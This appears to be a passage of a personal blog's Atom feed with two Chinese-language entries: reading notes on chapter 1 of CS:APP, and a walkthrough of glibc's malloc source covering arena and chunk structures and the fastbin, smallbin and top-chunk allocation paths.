<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>StarrySky</title>
  
  <subtitle>StarrySky&#39;s zone</subtitle>
  <link href="https://starrysky1004.github.io/atom.xml" rel="self"/>
  
  <link href="https://starrysky1004.github.io/"/>
  <updated>2023-05-05T09:15:41.298Z</updated>
  <id>https://starrysky1004.github.io/</id>
  
  <author>
    <name>StarrySky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>《CS:APP》阅读笔记（持续更新）</title>
    <link href="https://starrysky1004.github.io/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/"/>
    <id>https://starrysky1004.github.io/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/</id>
    <published>2023-05-04T12:10:45.000Z</published>
    <updated>2023-05-05T09:15:41.298Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="第一章-计算机系统漫游"><a href="#第一章-计算机系统漫游" class="headerlink" title="第一章 计算机系统漫游"></a>第一章 计算机系统漫游</h1><h2 id="1-1-信息就是位-上下文"><a href="#1-1-信息就是位-上下文" class="headerlink" title="1.1 信息就是位+上下文"></a>1.1 信息就是位+上下文</h2><p><strong>源程序</strong>：由值为<strong>0和1</strong>组成的<strong>位（比特）序列</strong></p><p><strong>.c文件</strong>：以<code>ASCII</code>字符组成的文本文件，以<strong>字节序列</strong>的方式储存在文件中，每个文本行以<code>\n</code>结尾，对应数字<code>10</code></p><p><strong>字节</strong>：<strong>八个位</strong>被组成的一组称为字节</p><p><strong>二进制文件</strong>：除了只由<code>ASCII</code>码组成的<strong>文本文件</strong>，其他都是二进制文件，系统中的所有<strong>信息</strong>都是由一串<strong>比特</strong>表示</p><p><strong>区分不同数据对象的唯一方法</strong>：数据对象的<strong>上下文</strong></p><p><strong>相关组织</strong>： <code>ANSI</code>  美国国家标准学会      <code>ISO</code>  国际标准化组织</p><h2 id="1-2程序被其他程序翻译成不同的格式"><a href="#1-2程序被其他程序翻译成不同的格式" class="headerlink" title="1.2程序被其他程序翻译成不同的格式"></a>1.2程序被其他程序翻译成不同的格式</h2><p><strong>二进制磁盘文件</strong>：<strong>机器语言指令</strong>按照<strong>可执行目标程序</strong>的格式打包好之后以<strong>二进制磁盘文件</strong>的形式存放</p><p><strong>目标程序</strong>：也称为<strong>可执行目标文件</strong>，或<strong>可执行文件</strong>，可以被加载到<strong>内存</strong>中，由<strong>系统</strong>执行</p><p><strong>编译器驱动程序</strong>：用于将<strong>源文件</strong>转化为<strong>目标文件</strong></p><p><strong>编译系统</strong>：预处理器 + 编译器 + 汇编器 + 链接器</p><p><strong>将源程序转化为目标文件的四个阶段</strong></p><table><thead><tr><th>阶段</th><th>工具</th><th>结果</th><th>扩展名</th><th>文件性质</th></tr></thead><tbody><tr><td>预处理阶段</td><td>预处理器 <code>cpp</code></td><td>根据以<code>#</code>开头的命令进行<strong>预处理</strong>，读取系统头文件中的内容并且<strong>直接插入</strong>到程序文本中</td><td><code>.i</code></td><td>文本文件</td></tr><tr><td>编译阶段</td><td>编译器     <code>ccl</code></td><td>将<code>.i</code>文件翻译成<strong>汇编语言程序</strong></td><td><code>.s</code></td><td>文本文件</td></tr><tr><td>汇编阶段</td><td>汇编器     <code>as</code></td><td>将<code>.s</code>文件翻译成<strong>机器语言指令</strong>，打包成<strong>可重定位目标程序</strong>格式</td><td><code>.o</code></td><td>二进制文件</td></tr><tr><td>链接阶段</td><td>连接器     <code>ld</code></td><td>将程序中调用的函数的单独编译好的<code>.o</code>目标文件和汇编得到的<code>.o</code>文件合并成<strong>可执行文件</strong>，存在<strong>磁盘</strong></td><td><code>\</code></td><td>二进制文件</td></tr></tbody></table><p><strong>GNU项目</strong>：完整的类<code>Unix</code>系统，源代码能不受限制的被修改和传播，其环境包括**<code>EMACS</code>编辑器，<code>GCC</code>编译器，<code>GDB</code>调试器，汇编器，链接器，处理二进制文件的工具**等</p><h2 id="1-3了解编译系统是如何工作的是大有益处的"><a href="#1-3了解编译系统是如何工作的是大有益处的" class="headerlink" title="1.3了解编译系统是如何工作的是大有益处的"></a>1.3了解编译系统是如何工作的是大有益处的</h2><ul><li>优化程序性能</li><li>理解链接时出现的错误</li><li>避免安全漏洞，比如限制从不受信任的源接收数据的数量和格式</li></ul><h2 id="1-4处理器读并解释储存在内存中的指令"><a href="#1-4处理器读并解释储存在内存中的指令" class="headerlink" title="1.4处理器读并解释储存在内存中的指令"></a>1.4处理器读并解释储存在内存中的指令</h2><p><code>shell</code>：命令行解释器</p><h3 id="1-4-1系统的硬件组成"><a href="#1-4-1系统的硬件组成" class="headerlink" title="1.4.1系统的硬件组成"></a>1.4.1系统的硬件组成</h3><h4 id="总线"><a href="#总线" class="headerlink" title="总线"></a>总线</h4><p><strong>作用</strong>：<strong>携带、传递定长的字节块</strong></p><p><strong>补充</strong>：字节块 &#x3D; 字， <strong>属性</strong>： 字节数 &#x3D; 字长， <strong>机器字长</strong>： 32位中字长为4字节，64位中字长为8字节</p><h4 id="I-x2F-O设备"><a href="#I-x2F-O设备" class="headerlink" title="I&#x2F;O设备"></a>I&#x2F;O设备</h4><p><strong>功能</strong>：通过<strong>控制器</strong>或<strong>适配器</strong>与<code>I/O</code>总线相连，在<code>I/O</code>主总线和<code>I/O</code>设备之间<strong>传递信息</strong></p><p><strong>封装方式的区别</strong>：<strong>控制器</strong>是I&#x2F;O设备本身或系统主印制电路板（即<strong>主板</strong>）上的<strong>芯片组</strong>，<strong>适配器</strong>是插在<strong>主板插槽上的卡</strong></p><h4 id="主存"><a href="#主存" class="headerlink" title="主存"></a>主存</h4><p><strong>作用</strong>：用来存放<strong>程序和程序处理的数据</strong>的<strong>临时存储设备</strong></p><p><strong>组成</strong>：由一组<strong>动态随机存取存储器（DRAM）芯片</strong>组成的线性的<strong>字节数组</strong></p><h4 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h4><p><strong>别称</strong>：中央处理单元、<code>CPU</code>、中央处理器</p><p><strong>功能</strong>：解释或执行存储在主存中的指令的引擎，不断执行<code>PC</code>指向的指令，解释指令中的位，执行该指令指示的简单操作，然后更新<code>PC</code>指向下一条指令（<strong>不一定相邻</strong>）</p><p><strong>简单指令</strong>：围绕着主存、寄存器文件、算术&#x2F;逻辑单元<code>ALU</code>进行，例如：加载、存储、操作、跳转</p><p><strong>寄存器文件</strong>：是一个小的<strong>存储设备</strong>，由一些<strong>单个字长的寄存器</strong>组成</p><p><strong><code>PC</code><strong>：区别于个人计算机，在计算机硬件中指</strong>程序计数器</strong>，大小为<strong>一个字</strong>的存储设备或寄存器，是处理器的<strong>核心</strong>，指向<strong>主存</strong>中的某条<strong>机器语言指令</strong></p><p><strong><code>ALU</code></strong>:在计算机硬件中指<strong>算术&#x2F;逻辑单元</strong>，用于<strong>计算</strong>新的<strong>数据和地址</strong>值</p><p><strong>指令集架构</strong>：描述每条机器代码指令的<strong>效果</strong></p><p><strong>微体系结构</strong>：描述处理器实际上是如何<strong>实现</strong></p><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/1.jpg" class title="系统的硬件组成"><h3 id="1-4-2运行程序"><a href="#1-4-2运行程序" class="headerlink" title="1.4.2运行程序"></a>1.4.2运行程序</h3><p><strong>从磁盘加载可执行文件到主存</strong>：shell执行指令加载可执行文件，将目标文件中的代码和数据从磁盘复制到主存</p><p><strong>直接存储器存取<code>DMA</code>技术</strong>:可以不通过处理器直接从磁盘到主存</p><p><strong>从磁盘读取<code>hello</code>命令</strong></p><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/2.jpg" class title="从磁盘读取hello命令"><p><strong>从磁盘加载可执行文件到主存</strong></p><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/3.jpg" class title="从磁盘加载可执行文件到主存"><p><strong>将输出字符串从存储器写到显示器</strong></p><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/4.jpg" class title="将输出字符串从存储器写到显示器"><h2 id="1-5高速缓存至关重要"><a href="#1-5高速缓存至关重要" class="headerlink" title="1.5高速缓存至关重要"></a>1.5高速缓存至关重要</h2><h3 id="高速缓存"><a href="#高速缓存" class="headerlink" title="高速缓存"></a>高速缓存</h3><p><strong>别称</strong>：高速缓存存储器、 <code>cache</code></p><p><strong>分类</strong>：<code>L1</code> 处理器芯片上、 <code>L2</code> 特殊总线连接到处理器、 <code>L3</code></p><p><strong>实现</strong>：<strong>静态随机访问存储器</strong><code>SRAM</code>的硬件技术</p><p><strong>作用</strong>：<strong>存放</strong>可能经常访问的<strong>数据</strong>，大部分的内存<strong>操作</strong>都能快速在高速缓存中完成</p><p><strong>优势</strong>：系统可以获得<strong>很大的存储器</strong>，同时<strong>访问速度</strong>也很快，利用了高速缓存的<strong>局部性原理</strong></p><h2 id="1-6存储设备形成层次结构"><a href="#1-6存储设备形成层次结构" class="headerlink" title="1.6存储设备形成层次结构"></a>1.6存储设备形成层次结构</h2><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/5.jpg" class title="一个存储器层次结构的示例"><p><strong>主要思想</strong>：上一层的存储器作为低一层存储器的高速缓存，了解不同的高速缓存和对整个存储器层次结构可以提高程序性能</p><h2 id="1-7操作系统管理硬件"><a href="#1-7操作系统管理硬件" class="headerlink" title="1.7操作系统管理硬件"></a>1.7操作系统管理硬件</h2><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><p><strong>功能</strong></p><ul><li>防止硬件被失控的应用程序滥用</li><li>向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备，<strong>所有应用程序对硬件的操作都必须通过操作系统</strong></li></ul><p><strong>实现</strong>：通过进程、虚拟内存、文件实现</p><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/6.jpg" class title="操作系统提供的抽象表示"><h3 id="1-7-1进程"><a href="#1-7-1进程" class="headerlink" title="1.7.1进程"></a>1.7.1进程</h3><p><strong>进程</strong>：操作系统对正在运行的程序的一种抽象</p><p><strong>并发运行</strong>：一个进程的指令和另一个进程的指令是<strong>交错执行</strong>的</p><p><strong>上下文</strong>：<strong>操作系统</strong>保持根据进程运行所需的所有<strong>状态信息</strong>，这种状态成为上下文</p><p><strong>上下文切换</strong>：操作系统<strong>实现交错执行的机制</strong>，执行的是<strong>内核代码</strong></p><p><strong>单处理器系统</strong>：只能执行<strong>一个进程</strong>代码，系统绝对把控制权从当前进程转移到新进程就会上下文切换，控制权传递到新进程</p><p><strong>内核kernel</strong>：从一个进程到另一个进程的<strong>转换</strong>是由操作系统内核<strong>管理</strong>的，内核时<strong>操作系统</strong>代码常驻主存的部分，不是一个独立的进程，而是系统管理全部进程所用代码和数据结构的集合。</p><p><strong>系统调用</strong>：应用程序需要系统的某些操作时，执行系统调用将<strong>控制权</strong>传递给操作系统<strong>内核</strong>，内核执行被请求的操作并返回应用程序</p><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/7.jpg" class title="进程的上下文切换"><h3 id="1-7-2线程"><a href="#1-7-2线程" class="headerlink" title="1.7.2线程"></a>1.7.2线程</h3><p><strong>线程</strong>:组成进程的<strong>执行单元</strong>，运行在进程的上下文中，每个线程共享同样的代码和全局数据</p><p><strong>多线程的优点</strong>：容易共享数据，高效，运行的快</p><h3 id="1-7-3虚拟内存"><a href="#1-7-3虚拟内存" class="headerlink" title="1.7.3虚拟内存"></a>1.7.3虚拟内存</h3><p><strong>虚拟内存</strong>：是一个抽象概念，为每个进程提供了独占的使用主存的假象，其运作需要硬件和操作系统软件的交互</p><p><strong>虚拟地址空间</strong>：每个进程看到的一致的内存</p><p><strong>虚拟地址空间的区域</strong>（由低地址到高地址）</p><table><thead><tr><th>区域名称</th><th>内容</th></tr></thead><tbody><tr><td>程序代码和数据</td><td>代码从固定地址开始，接着是C全局变量对应的数据位置</td></tr><tr><td>堆</td><td>动态扩展和收缩</td></tr><tr><td>共享库</td><td>存放例如C标准库、数学库这样的共享库的代码和数据的区域</td></tr><tr><td>栈</td><td>用户虚拟地址空间顶部的是用户栈，用于实现函数调用，动态扩展和收缩，调用函数时栈增长，反之收缩</td></tr><tr><td>内核虚拟内存</td><td>地址空间顶部，不允许应用程序读写或直接调用内核代码定义的函数，必须调用内核来执行</td></tr></tbody></table><p><strong>基本思想</strong>：把一个进程虚拟内存的内容存储在磁盘上，然后用主存作为磁盘的高速缓存</p><h3 id="1-7-4文件"><a href="#1-7-4文件" class="headerlink" title="1.7.4文件"></a>1.7.4文件</h3><p><strong>文件</strong>：是<strong>字节序列</strong>，向应用程序提供了一个<strong>统一的视图</strong>来看待各种<code>I/O</code>设备。每个<code>I/O</code>设备包括磁盘、键盘、显示器、网络都可以看成文件。系统所有输入输出都是通过称为<code>Unix I/O</code>的系统函数调用<strong>读写文件</strong>来实现</p><h2 id="1-8系统之间利用网络通信"><a href="#1-8系统之间利用网络通信" class="headerlink" title="1.8系统之间利用网络通信"></a>1.8系统之间利用网络通信</h2><p><strong>网络</strong>：可视为<code>I/O</code>设备，系统从主存复制字符串到<strong>网络适配器</strong>时经过网络到达另一台机器，系统可以读取从其他机器发送来的数据并且<strong>直接复制到主存</strong>而不用通过本地磁盘</p><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/8.jpg" class title="网络也是一种I&#x2F;O设备"><h2 id="1-9重要主题"><a href="#1-9重要主题" class="headerlink" title="1.9重要主题"></a>1.9重要主题</h2><p><strong>计算机系统</strong>：是<strong>硬件和系统</strong>软件相互交织的集合体，它们要共同协作才能运行应用程序</p><h3 id="1-9-1-Amdahl定律"><a href="#1-9-1-Amdahl定律" class="headerlink" title="1.9.1 Amdahl定律"></a>1.9.1 Amdahl定律</h3><p><strong>公式</strong>：<code>S=1/((1-a)+a/n)</code></p><p><strong>解释</strong>：</p><p>S 加速比，结果表示的倍数用X表示，例如2.2X</p><p>a  系统某部分所需执行时间 &#x2F; 系统执行某应用程序需要的时间</p><p>n  该部分性能提升比例</p><p><strong>主要观点</strong>：要想显著加速整个系统，必须提示全系统中相当大的部分的速度</p><h3 id="1-9-2并发和并行"><a href="#1-9-2并发和并行" class="headerlink" title="1.9.2并发和并行"></a>1.9.2并发和并行</h3><p><strong>并发</strong>：一个同时具有多个活动的系统</p><p><strong>并行</strong>：用并发来使一个系统运行更快</p><p><strong>由高到低的三个层次</strong></p><ul><li><strong>线程级并发</strong><ul><li><strong>多处理器系统</strong>：由单个操作系统内核控制的多个处理器组成的系统</li><li><strong>多核处理器</strong>：将多个CPU（称为核）集成到一个集成电路芯片上<img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/10.jpg" class title="不同处理器配置分类"></li><li><strong>多核</strong>：多个处理器集成在一个芯片上，每个核都有自己的L1和L2高速缓存，L1高速缓存一部分保存最近取到的指令，另一部分保存数据。这些核共享更高层次的高速缓存以及到主存的接口<img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/9.jpg" class title="多核处理器的组织结构"></li><li><strong>超线程</strong>：又称为同时多线程，允许一个CPU执行多个控制流的技术，区别于常规处理器需要20000个时钟周期做不同线程的转换，超线程的处理器在单个周期的基础上决定要执行哪个线程，更好的处理资源</li><li><strong>多处理器</strong>：减少了执行多个任务是模拟并发的需要，使程序运行的更快。要求程序以多线程的方式来书写，可以并行地高效执行</li></ul></li><li><strong>指令级并行</strong><ul><li><strong>指令级并行</strong>：较低的抽象层次上，现代处理器可以同时执行多条指令的属性</li><li><strong>超标量处理器</strong>：处理器可以达到比一个周期一条指令更快的执行速率</li></ul></li><li><strong>单指令、多数据并行</strong><ul><li><strong>SIMD并行</strong>：单指令、多数据，允许一条指令产生多个可以并行执行是操作</li><li><strong>优点</strong>：提高处理影像、声音、视频数据应用是执行速度</li></ul></li></ul><h3 id="1-9-3计算机系统中抽象的重要性"><a href="#1-9-3计算机系统中抽象的重要性" class="headerlink" title="1.9.3计算机系统中抽象的重要性"></a>1.9.3计算机系统中抽象的重要性</h3><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/11.jpg" class title="计算机系统提供的一些抽象"><p><strong>指令集架构</strong>：提供了对实际处理器硬件的抽象</p><p><strong>虚拟机</strong>：提供对整个计算机的抽象</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;第一章-计算机系统漫游&quot;&gt;&lt;a href=&quot;#第一章-计算机系统漫游&quot; class=&quot;headerlink&quot; title=&quot;第一章 计算机系统漫游&quot;&gt;&lt;/a&gt;第一章 计算机系统漫游&lt;/h1&gt;&lt;h2 id=&quot;1-1-信息就是位-上下文&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="计算机系统" scheme="https://starrysky1004.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="计算机系统" scheme="https://starrysky1004.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>glibc源码分析-malloc-free</title>
    <link href="https://starrysky1004.github.io/2023/04/22/glibc-yuan-ma-fen-xi-malloc-free/glibc-yuan-ma-fen-xi-malloc-free/"/>
    <id>https://starrysky1004.github.io/2023/04/22/glibc-yuan-ma-fen-xi-malloc-free/glibc-yuan-ma-fen-xi-malloc-free/</id>
    <published>2023-04-22T12:41:11.000Z</published>
    <updated>2023-04-22T12:43:19.800Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h1><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct malloc_state&#123;  &#x2F;* Serialize access.  *&#x2F;  mutex_t mutex;  &#x2F;* Flags (formerly in max_fast).  *&#x2F;  int flags;  &#x2F;* Fastbins *&#x2F;  mfastbinptr fastbinsY[NFASTBINS];  &#x2F;* Base of the topmost chunk -- not otherwise kept in a bin *&#x2F;  mchunkptr top;  &#x2F;* The remainder from the most recent split of a small request *&#x2F;  mchunkptr last_remainder;  &#x2F;* Normal bins packed as described above *&#x2F;  mchunkptr bins[NBINS * 2 - 2];  &#x2F;* Bitmap of bins *&#x2F;  unsigned int binmap[BINMAPSIZE];  &#x2F;* Linked list *&#x2F;  struct malloc_state *next;  &#x2F;* Linked list for free arenas.  Access to this field is serialized     by free_list_lock in arena.c.  *&#x2F;  struct malloc_state *next_free;  &#x2F;* Number of threads attached to this arena.  0 if the arena is on     the free list.  Access to this field is serialized by     free_list_lock in arena.c.  *&#x2F;  INTERNAL_SIZE_T attached_threads;  &#x2F;* Memory allocated from the system in this arena.  *&#x2F;  INTERNAL_SIZE_T system_mem;  INTERNAL_SIZE_T max_system_mem;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct malloc_chunk &#123;  INTERNAL_SIZE_T      mchunk_prev_size;  &#x2F;* Size of previous chunk (if free).  *&#x2F;  INTERNAL_SIZE_T      mchunk_size;       &#x2F;* Size in bytes, including overhead. *&#x2F;  struct malloc_chunk* fd;         &#x2F;* double links -- used only if free. *&#x2F;  struct malloc_chunk* bk;  &#x2F;* Only used for large blocks: pointer to next larger size.  *&#x2F;  struct malloc_chunk* fd_nextsize; &#x2F;* double links -- used only if free. *&#x2F;  struct malloc_chunk* bk_nextsize;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="初次创建堆"><a href="#初次创建堆" class="headerlink" title="初次创建堆"></a>初次创建堆</h1><h2 id="非mmap"><a href="#非mmap" class="headerlink" title="非mmap"></a>非mmap</h2><h3 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;malloc(0x30);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程"><a href="#运行过程" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>进入<code>__libc_malloc  </code></p></li><li><p>调用<code>__malloc_hook</code>中的函数来完成堆分配并返回，若为默认值则向下运行</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void *(*hook) (size_t, const void *)    &#x3D; atomic_forced_read (__malloc_hook);  if (__builtin_expect (hook !&#x3D; NULL, 0))    return (*hook)(bytes, RETURN_ADDRESS (0));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>程序第一次运行<code>__libc_malloc  </code>时，<code>__malloc_hook</code>中的值是<code>hook.c</code>中的<code>malloc_hook_ini</code>函数，因此会调用该函数，用于对<code>__malloc_hook</code>进行初始化，初始化结束后值为0，后续再创建堆就是默认值0</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">malloc_hook_ini (size_t sz, const void *caller)&#123;  __malloc_hook &#x3D; NULL;  ptmalloc_init ();  return __libc_malloc (sz);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>初始化过程：设置<code>__malloc_hook</code>为NULL，再调用<code>arena.c</code>中的<code>ptmalloc_init</code>进行初始化，<code>__malloc_initialized &gt; 0 </code>表示初始化完成</p></li><li><p>补充：<code>__builtin_expect</code></p><ul><li><p>作用：允许程序员将最有可能执行的分支告诉编译器</p></li><li><p>写法：<code>__builtin_expect(EXP, N)</code></p></li><li><p>含义：<code>EXP==N</code>的概率很大</p></li><li><p>返回值：当<code>EXP==N</code>时返回0，反之返回1</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define unlikely(x) __builtin_expect(!!(x), 0) &#x2F;&#x2F;x很可能为假#define likely(x) __builtin_expect(!!(x), 1) &#x2F;&#x2F;x很可能为真<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;if成立的条件是hook !&#x3D; NULL成立，即hook不为空，则去调用hook中的函数if (__builtin_expect (hook !&#x3D; NULL, 0))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li></ul></li><li><p>调用<code>arena_get</code> 获取到管理空闲空间的分配区地址，申请的堆块就在这里</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">arena_get (ar_ptr, bytes);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>进入<code>_int_malloc</code>函数</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">victim &#x3D; _int_malloc (ar_ptr, bytes);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>victim</code>指向<code>_int_malloc</code>分配的内存</p></li><li><p>计算分配的实际大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">checked_request2size (bytes, nb);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><code>ptmalloc</code> 以 chunk 为单位分配空间，传入的bytes 是用户提交的原始的空间大小</strong></p><p><strong><code>nb</code> 是为计算得到的 chunk 的大小</strong></p></li><li><p>检查是否有可用空间</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__glibc_unlikely (av &#x3D;&#x3D; NULL))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><code>av = ar_ptr </code>是<code>arena_get</code> 获取到的分配区地址指针</strong></p></li><li><p>判断是否属于<code>fastbin</code></p><ul><li><p>通过判断<code>nb &lt;= get_max_fast()</code>即申请的实际大小是否小于<code>fastbin</code>最大值来判断是否属于<code>fastbin</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((unsigned long) (nb) &lt;&#x3D; (unsigned long) (get_max_fast ()))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>属于<code>fastbin</code>则继续运行</p></li><li><p>获取实际大小<code>nb</code>所在的<code>fastbin</code>链表的<code>index</code>，并且获取指向该链表的第一个结点的指针</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">idx &#x3D; fastbin_index (nb);mfastbinptr *fb &#x3D; &amp;fastbin (av, idx);mchunkptr pp &#x3D; *fb;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>判断指向的chunk是否为空</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">do&#123;     victim &#x3D; pp;        if (victim &#x3D;&#x3D; NULL)        break;&#125;while ((pp &#x3D; catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该 chunk 为空，说明当前 <code>fastbin </code>中没有刚好匹配 <code>nb </code>大小的空闲 <code>chunk</code></p></li></ul></li><li><p>判断是否属于<code>smallbin</code></p><ul><li><p>通过调用<code>in_smallbin_range</code>函数判断是否属于<code>smallbin</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (in_smallbin_range (nb))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取该大小所在的链表的<code>index</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">idx &#x3D; smallbin_index (nb);bin &#x3D; bin_at (av, idx);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>判断<code>smallbin</code>是否为空，为空则跳过剩下的代码</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((victim &#x3D; last (bin)) !&#x3D; bin)    &#123;          if (victim &#x3D;&#x3D; 0) &#x2F;* initialization check *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><p>​<code>victim</code>指向<code>smallbin</code>中的最后一个bin，若其为空则<code>smallbin</code>为空</p><ul><li><p>调用<code>malloc_consolidate </code>整理<code>fastbins</code></p><ul><li><p>判断完不属于<code>smallbin</code>之后说明空间在<code>largebin</code>,不会立即检查<code>largebin</code>而是调用<code>malloc_consolidate </code>将<code>fastbins </code>里面的空闲 <code>chunk </code>合并整理到 <code>unsortedbin </code>中</p></li><li><p>判断<code>fastbins </code>为空，跳过</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else    &#123;      idx &#x3D; largebin_index (nb);      if (have_fastchunks (av))        malloc_consolidate (av);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>尝试切割top分配空间</p><ul><li><p>获取到 top chunk 的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">victim &#x3D; av-&gt;top;size &#x3D; chunksize (victim);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>victim</code>指向<code>av</code>内存空间中的<code>top chunk</code></p></li><li><p>和申请的空间大小做比较：如果 top chunk 在满足分配后还能剩余空间大小大于最小的 chunk 的大小，则开始进行切割，并把剩余的 chunk 作为新的 top chunk</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((unsigned long) (size) &gt;&#x3D; (unsigned long) (nb + MINSIZE))        &#123;          remainder_size &#x3D; size - nb;          remainder &#x3D; chunk_at_offset (victim, nb);          av-&gt;top &#x3D; remainder;          set_head (victim, nb | PREV_INUSE |                    (av !&#x3D; &amp;main_arena ? NON_MAIN_ARENA : 0));          set_head (remainder, remainder_size | PREV_INUSE);          check_malloced_chunk (av, victim, nb);          void *p &#x3D; chunk2mem (victim);          alloc_perturb (p, bytes);          return p;        &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>否则先判断fastbin是否非空，非空则重整理，fastbin和unsorted bin</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else if (have_fastchunks (av))        &#123;          malloc_consolidate (av);          &#x2F;* restore original bin index *&#x2F;          if (in_smallbin_range (nb))            idx &#x3D; smallbin_index (nb);          else            idx &#x3D; largebin_index (nb);        &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>不为空，调用sysmalloc直接向系统申请内存</p><pre 